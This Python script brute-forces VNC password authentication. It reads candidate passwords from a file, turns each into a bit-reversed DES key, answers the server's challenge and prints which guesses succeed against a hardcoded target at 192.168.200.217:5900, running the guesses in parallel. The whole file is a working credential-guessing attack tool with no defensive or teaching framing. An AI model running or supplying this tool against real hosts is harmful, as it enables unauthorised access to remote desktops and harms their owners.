import socket
from Cryptodome.Cipher import DES
from  multiprocessing import Process,Pool

def pad(text):
    while len(text) % 8 != 0:
        text += ' '
    return text

def byte_flip(key):
    # from   00110001 00110010 00110011
    # to     10001100 01001100 11001100
    rev_key = b''
    for byt in key:
        # print(byt,type(byt))
        sub_tmp = bin(byt)[2:].rjust(8,'0')
        sub_tmp = sub_tmp[::-1] # byte flip
        sub_tmp = int(sub_tmp,2).to_bytes()
        rev_key += sub_tmp

    return rev_key

def des_crypt(challenge, key):
    # input should be all bytes
    sub_key = byte_flip(key)

    des = DES.new(sub_key, DES.MODE_ECB) 
    text = challenge
    padded_text = pad(text)

    encrypted_text = des.encrypt(padded_text) 
    # print(encrypted_text.hex())

    return encrypted_text

def vnc_auth(ipaddr,port,byte_key):
    # str, int, bytes
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_socket.connect((ipaddr,int(port)))
    
    server_protocol_version = tcp_socket.recv(1024)
    # print("Server protocol version: ",server_protocol_version)
    tcp_socket.send(server_protocol_version)

    type_res = tcp_socket.recv(1024)
    # print("Security types: ",type_res)
    if len(type_res)==0:
        return
    type_num, sec_type = type_res[0],type_res[1:]
    # print("Number of security types: ", type_num, ", Security type: ", sec_type)
    tcp_socket.send(bytes.fromhex(str(sec_type[0]).rjust(2,'0')))

    challenge = tcp_socket.recv(1024)
    # print("Authentication challenge: ",challenge)
    response = des_crypt(challenge,byte_key)
    # print("Authentication response: ",response)
    tcp_socket.send(response)

    auth_result = tcp_socket.recv(1024)
    print(auth_result==bytes.fromhex('00000000'),'\t',byte_key,'\t',auth_result)
    tcp_socket.close()

if __name__ == "__main__":
    ipaddr = "192.168.200.217";port=5900;key = b"key"
    key_list = []

    ### read pass from file
    with open('./pw.txt','rb') as pw:
        raw_passes = pw.readlines()
        for raw_pass in raw_passes:
            raw_pass = raw_pass.strip(b'\r\n')
            if len(raw_pass)>8:
                raw_pass = raw_pass[:8]
            else:
                raw_pass = raw_pass.ljust(8,b'\x00')
            # print(raw_pass)
            key_list.append(raw_pass)
    
    ### multiprocess
    pool = Pool(5)
    for key in key_list:
        pool.apply_async(func = vnc_auth, args = (ipaddr, port, key))
    pool.close()
    pool.join()

    ### single process
    # for key in key_list:
    #     vnc_auth(ipaddr,port,key)

    # des_test()
    